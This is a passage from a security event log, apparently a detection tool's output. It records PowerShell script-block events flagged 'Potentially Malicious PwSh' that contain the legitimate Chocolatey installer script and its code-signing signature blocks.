Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgXsA5aCMtwLzuWhLs2FaLNT7REsusAIhwY2Iq # EkDS/Q8wDQYJKoZIhvcNAQEBBQAEggEArJzii4jIhomTeGpuqOAkkDvDQqvjf4Wq # IBlW4TP7BefeE/t+VzrwUmYJbJkaUOJBNzKvhXsCLieTPZIDCrEmdppIAUnDUlXa # +1W/liIDUNt5ah+UT+J/R2KluLt0pWDaihoMNTTTcxC7M1NMyg6tSnlTYLvpUqLj # LX8dJvNGcpiJ4imA/MvNPo7UC89xvm906L1o7iEpkUNBM2Dn2XSFflWDL+8+Q8L7 # Chea9WExm20eB8Yf9KydxZCqg6jWtIrQ5cTggGo6ziYNzi0q+PBrREUE0euoq+Y5 # /lwJwEKQ6vlUcGDVHYXNbd5YPqtYMEt5qV17TghBplxoLQCdhbpHeqGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTgwNzA0MjAyOTU3WjAjBgkqhkiG9w0BCQQxFgQUCIzjahafhtTjn6Nk # oo8bBRxKBmswDQYJKoZIhvcNAQEBBQAEggEAGEYMaE39CtWQozI5L+tmWxb7JSOA # DgUlD3f6oJ5/Y/IYWovlninVi1ZV7PeOfyCHP+W2zrD51AXRX2ZW7EF6MBaNqUP5 # ye+h24SqvqxTbiv01uiS7r5u6Grr1H6/9OLn7yUSK/9lJ+k2Ee0QRlXi5/rVmT05 # BBxpRGDpppGM6fPZA8J2zAvxrz0RuTB0uUa48TpmZu2PyB59Rt+GIwNXDts4cRXY # 9SxAsrtpCJastjdJwT+hAPTtPfrUVYiLLjG3Ft6+8r9WGSlQWUwgAzXtKoP+Hbsv # 9WT3RRowlsmEvOVqdEHh2pIPfpQgIzf+D7fAr6BZCAvrJiMYMfQVs4QMDA== # SIG # End signature block","MessageNumber: 2 ¦ MessageTotal: 2 ¦ Path: ¦ ScriptBlockId: e992c6bd-f3bf-42a3-80ea-9e74d03e44fe ¦ ScriptBlockText: chocolatey.nupkg is in the lib folder' $chocoPkgDir = Join-Path $chocoPath 'lib\chocolatey' $nupkg = Join-Path $chocoPkgDir 'chocolatey.nupkg' if (![System.IO.Directory]::Exists($chocoPkgDir)) { [System.IO.Directory]::CreateDirectory($chocoPkgDir); } Copy-Item ""$file"" ""$nupkg"" -Force -ErrorAction SilentlyContinue # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCwOp6FidSBO5Iv # lE9iERBozojbv+kSIs4jFgY+Ky11ZqCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgXsA5aCMtwLzuWhLs2FaLNT7REsusAIhwY2Iq # EkDS/Q8wDQYJKoZIhvcNAQEBBQAEggEArJzii4jIhomTeGpuqOAkkDvDQqvjf4Wq # IBlW4TP7BefeE/t+VzrwUmYJbJkaUOJBNzKvhXsCLieTPZIDCrEmdppIAUnDUlXa # +1W/liIDUNt5ah+UT+J/R2KluLt0pWDaihoMNTTTcxC7M1NMyg6tSnlTYLvpUqLj # LX8dJvNGcpiJ4imA/MvNPo7UC89xvm906L1o7iEpkUNBM2Dn2XSFflWDL+8+Q8L7 # Chea9WExm20eB8Yf9KydxZCqg6jWtIrQ5cTggGo6ziYNzi0q+PBrREUE0euoq+Y5 # /lwJwEKQ6vlUcGDVHYXNbd5YPqtYMEt5qV17TghBplxoLQCdhbpHeqGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTgwNzA0MjAyOTU3WjAjBgkqhkiG9w0BCQQxFgQUCIzjahafhtTjn6Nk # oo8bBRxKBmswDQYJKoZIhvcNAQEBBQAEggEAGEYMaE39CtWQozI5L+tmWxb7JSOA # DgUlD3f6oJ5/Y/IYWovlninVi1ZV7PeOfyCHP+W2zrD51AXRX2ZW7EF6MBaNqUP5 # ye+h24SqvqxTbiv01uiS7r5u6Grr1H6/9OLn7yUSK/9lJ+k2Ee0QRlXi5/rVmT05 # BBxpRGDpppGM6fPZA8J2zAvxrz0RuTB0uUa48TpmZu2PyB59Rt+GIwNXDts4cRXY # 9SxAsrtpCJastjdJwT+hAPTtPfrUVYiLLjG3Ft6+8r9WGSlQWUwgAzXtKoP+Hbsv # 9WT3RRowlsmEvOVqdEHh2pIPfpQgIzf+D7fAr6BZCAvrJiMYMfQVs4QMDA== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:31.331 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,53,"ScriptBlock: $thisScriptFolder = (Split-Path -parent $MyInvocation.MyCommand.Definition) $chocInstallVariableName = ""ChocolateyInstall"" $sysDrive = $env:SystemDrive $tempDir = $env:TEMP $defaultChocolateyPathOld = ""$sysDrive\Chocolatey"" $originalForegroundColor = $host.ui.RawUI.ForegroundColor function Write-ChocolateyWarning { param ( [string]$message = '' ) try { Write-Host ""WARNING: $message"" -ForegroundColor ""Yellow"" -ErrorAction ""Stop"" } catch { Write-Output ""WARNING: $message"" } } function Write-ChocolateyError { param ( [string]$message = '' ) try { Write-Host ""ERROR: $message"" -ForegroundColor ""Red"" -ErrorAction ""Stop"" } catch { Write-Output ""ERROR: $message"" } } function Initialize-Chocolatey { <# .DESCRIPTION This will initialize the Chocolatey tool by a) setting up the ""chocolateyPath"" (the location where all chocolatey nuget packages will be installed) b) Installs chocolatey into the ""chocolateyPath"" c) Instals .net 4.0 if needed d) Adds Chocolatey to the PATH environment variable so you have access to the choco commands. .PARAMETER ChocolateyPath Allows you to override the default path of (C:\ProgramData\chocolatey\) by specifying a directory chocolatey will install nuget packages. .EXAMPLE C:\PS> Initialize-Chocolatey Installs chocolatey into the default C:\ProgramData\Chocolatey\ directory. .EXAMPLE C:\PS> Initialize-Chocolatey -chocolateyPath ""D:\ChocolateyInstalledNuGets\"" Installs chocolatey into the custom directory D:\ChocolateyInstalledNuGets\ #> param( [Parameter(Mandatory=$false)][string]$chocolateyPath = '' ) Write-Debug ""Initialize-Chocolatey"" $installModule = Join-Path $thisScriptFolder 'chocolateyInstall\helpers\chocolateyInstaller.psm1' Import-Module $installModule -Force if ($chocolateyPath -eq '') { $programData = [Environment]::GetFolderPath(""CommonApplicationData"") $chocolateyPath = Join-Path ""$programData"" 'chocolatey' } # variable to allow insecure directory: $allowInsecureRootInstall = $false if ($env:ChocolateyAllowInsecureRootDirectory -eq 'true') { $allowInsecureRootInstall = $true } # if we have an already environment variable path, use it. $alreadyInitializedNugetPath = Get-ChocolateyInstallFolder if ($alreadyInitializedNugetPath -and $alreadyInitializedNugetPath -ne $chocolateyPath -and ($allowInsecureRootInstall -or $alreadyInitializedNugetPath -ne $defaultChocolateyPathOld)){ $chocolateyPath = $alreadyInitializedNugetPath } else { Set-ChocolateyInstallFolder $chocolateyPath } Create-DirectoryIfNotExists $chocolateyPath Ensure-Permissions $chocolateyPath #set up variables to add $chocolateyExePath = Join-Path $chocolateyPath 'bin' $chocolateyLibPath = Join-Path $chocolateyPath 'lib' if ($tempDir -eq $null) { $tempDir = Join-Path $chocolateyPath 'temp' Create-DirectoryIfNotExists $tempDir } $yourPkgPath = [System.IO.Path]::Combine($chocolateyLibPath,""yourPackageName"") @"" We are setting up the Chocolatey package repository. The packages themselves go to `'$chocolateyLibPath`' (i.e. $yourPkgPath). A shim file for the command line goes to `'$chocolateyExePath`' and points to an executable in `'$yourPkgPath`'. Creating Chocolatey folders if they do not already exist. ""@ | Write-Output Write-ChocolateyWarning ""You can safely ignore errors related to missing log files when `n upgrading from a version of Chocolatey less than 0.9.9. `n 'Batch file could not be found' is also safe to ignore. `n 'The system cannot find the file specified' - also safe."" #create the base structure if it doesn't exist Create-DirectoryIfNotExists $chocolateyExePath Create-DirectoryIfNotExists $chocolateyLibPath Install-ChocolateyFiles $chocolateyPath Ensure-ChocolateyLibFiles $chocolateyLibPath Install-ChocolateyBinFiles $chocolateyPath $chocolateyExePath $chocolateyExePathVariable = $chocolateyExePath.ToLower().Replace($chocolateyPath.ToLower(), ""%DIR%..\"").Replace(""\\"",""\"") Initialize-ChocolateyPath $chocolateyExePath $chocolateyExePathVariable Process-ChocolateyBinFiles $chocolateyExePath $chocolateyExePathVariable $realModule = Join-Path $chocolateyPath ""helpers\chocolateyInstaller.psm1"" Import-Module ""$realModule"" -Force if (-not $allowInsecureRootInstall -and (Test-Path($defaultChocolateyPathOld))) { Upgrade-OldChocolateyInstall $defaultChocolateyPathOld $chocolateyPath Install-ChocolateyBinFiles $chocolateyPath $chocolateyExePath } Add-ChocolateyProfile Install-DotNet4IfMissing Invoke-Chocolatey-Initial if ($env:ChocolateyExitCode -eq $null -or $env:ChocolateyExitCode -eq '') { $env:ChocolateyExitCode = 0 } @"" Chocolatey (choco.exe) is now ready. You can call choco from anywhere, command line or powershell by typing choco. Run choco /? for a list of functions. You may need to shut down and restart powershell and/or consoles first prior to using choco. ""@ | write-Output if (-not $allowInsecureRootInstall) { Remove-OldChocolateyInstall $defaultChocolateyPathOld } } function Set-ChocolateyInstallFolder { param( [string]$folder ) Write-Debug ""Set-ChocolateyInstallFolder"" $environmentTarget = [System.EnvironmentVariableTarget]::User # removing old variable Install-ChocolateyEnvironmentVariable -variableName ""$chocInstallVariableName"" -variableValue $null -variableType $environmentTarget if (Test-ProcessAdminRights) { Write-Debug ""Administrator installing so using Machine environment variable target instead of User."" $environmentTarget = [System.EnvironmentVariableTarget]::Machine # removing old variable Install-ChocolateyEnvironmentVariable -variableName ""$chocInstallVariableName"" -variableValue $null -variableType $environmentTarget } else { Write-ChocolateyWarning ""Setting ChocolateyInstall Environment Variable on USER and not SYSTEM variables.`n This is due to either non-administrator install OR the process you are running is not being run as an Administrator."" } Write-Output ""Creating $chocInstallVariableName as an environment variable (targeting `'$environmentTarget`') `n Setting $chocInstallVariableName to `'$folder`'"" Write-ChocolateyWarning ""It's very likely you will need to close and reopen your shell `n before you can use choco."" Install-ChocolateyEnvironmentVariable -variableName ""$chocInstallVariableName"" -variableValue ""$folder"" -variableType $environmentTarget } function Get-ChocolateyInstallFolder(){ Write-Debug 